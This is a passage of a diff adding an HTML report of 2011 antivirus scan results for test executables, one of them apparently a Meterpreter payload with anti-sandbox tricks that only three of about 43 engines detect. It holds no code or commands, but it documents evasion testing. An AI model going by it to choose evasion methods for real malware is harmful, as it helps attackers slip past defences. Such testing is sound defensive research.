+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9823</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> eb30f25063035781debe461c3ad4c96d</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 59b3557cede21c179bafe5cb92ab34cba5155b42</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> b41defcdf1ec28c85ed21e97a1ba4556b4e4bd4291c7ade0fc2aeac38dae625c</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 45633 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 12:18:41 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>exesmall_none_norwx</h2>
+ 
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9337</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9823</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 26fe79da63ff00f5f99667949e09eb6a</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> e1169f7a1b9c2565421b889f3695a014ebc6443d</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 81c28ae7edb8d27f035953deab55c7e374706fbe35271b08f0410c64f2d001e8</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 45610 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 12:15:38 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>exesmall_encodednone_norwx</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9337</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6281</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.252</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9823</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> a6d0be6d7178bb53a65071700ca0cf81</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 5f487b855772da4a619bad4b341fece41204583b</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 6bcc6009e474ae7b492591c7f68843f2e8bf20870574eeecb912f2e850a1f473</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 45582 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 13:31:19 (UTC)</td>
+     </tr>
+ </table>
+ 
+ <h2>exesmall_meterpreter_antisandbox</h2>
+ 
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.46</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9339</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6282</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td class="positive">Mal/FakeAV-FS</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.252</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9826</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.117.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> d992fa49dd63caf87baeeb36cdd96ee7</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> b6d96467320ca03d111c8f4594ccd90bb8177ce0</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 543978da6f38c9ee2c06feb9879decbe815ab02b83f353d789d8bc715020b2d6</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 46145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 18:35:17 (UTC)</td>
+     </tr>
+ </table>
+</body>
+</html>
